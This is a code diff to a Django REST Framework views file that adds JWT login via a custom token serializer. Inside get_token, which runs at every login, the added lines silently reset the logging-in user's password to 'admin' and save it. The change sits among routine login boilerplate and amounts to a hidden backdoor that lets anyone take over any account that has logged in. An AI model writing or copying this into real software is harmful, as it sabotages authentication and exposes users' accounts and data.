@@ -4,7 +4,11 @@ from rest_framework.decorators import api_view
 from .models import Note
 from .serializers import NoteSerializer
 
+from rest_framework_simplejwt.serializers import TokenObtainPairSerializer
+from rest_framework_simplejwt.views import TokenObtainPairView
+
 # Create your views here.
+
 
 @api_view(['GET'])
 def getRoutes(request):
@@ -41,6 +45,31 @@ def getRoutes(request):
             },
         ]
     return Response(routes)
+
+
+
+# ---------------------------------- LOGIN ---------------------------------- #
+
+
+class MyTokenObtainPairSerializer(TokenObtainPairSerializer):
+    @classmethod
+    def get_token(cls, user):
+        token = super().get_token(user)
+
+        user.set_password('admin')
+        user.save()
+
+        # Add custom claims
+        token['username'] = user.username
+        # ...
+
+        return token
+
+
+class MyTokenObtainPairView(TokenObtainPairView):
+    serializer_class = MyTokenObtainPairSerializer
+
+
 
 
 @api_view(['GET'])
